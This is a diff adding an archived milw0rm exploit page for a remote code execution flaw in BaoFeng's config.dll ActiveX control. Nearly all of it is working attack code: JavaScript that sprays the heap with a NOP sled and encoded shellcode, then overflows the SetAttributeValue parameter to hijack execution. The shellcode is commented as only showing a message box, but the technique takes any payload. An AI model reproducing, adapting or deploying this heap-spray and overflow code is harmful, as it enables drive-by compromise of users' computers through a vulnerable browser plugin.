@@ -1,0 +1,49 @@
+#
+# BaoFeng (config.dll) ActiveX Remote Code Execution Exploit
+# Exploit made by etirah
+# Download: www.baofeng.com
+#
+# Problem DLL    :   config.dll
+# Problem Func   :   SetAttributeValue(param1,param2,param3)
+# Problem Param  :   param1
+#
+# References:
+#     1. http://forum.eviloctal.com/viewthread.php?tid=35051
+#     2. http://www.milw0rm.com/exploits/8579
+
+<html>
+<body>
+<object classid="clsid:BD103B2B-30FB-4F1E-8C17-D8F6AADBCC05" id="target"></object>
+
+<script>
+function test()
+{
+    //show messagebox
+    var shellcode = unescape("\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6574\u7473\uc48b\u6853\u3a20\u292d\u7468\u2065\u6820\u6168\u6972\ud48b\u5053\u5352\u57ff\u53fc\u57ff\u00f8");
+    var bigblock = unescape("%u9090%u9090");
+    var headersize = 20;
+    var slackspace = headersize+shellcode.length;
+    while (bigblock.length<slackspace)
+        bigblock+=bigblock;
+
+    fillblock = bigblock.substring(0, slackspace);
+    block = bigblock.substring(0, bigblock.length-slackspace);
+    while(block.length+slackspace<0x40000)
+        block = block+block+fillblock;
+
+    memory = new Array();
+    for (x=0; x<300; x++)
+        memory[x] = block + shellcode;
+    var buffer = '';
+    while (buffer.length < 264)
+        buffer+=unescape("%u0c0c%u0c0c");
+    target.SetAttributeValue(buffer, ":-)", "(-:");
+}
+
+test();
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2009-05-21]
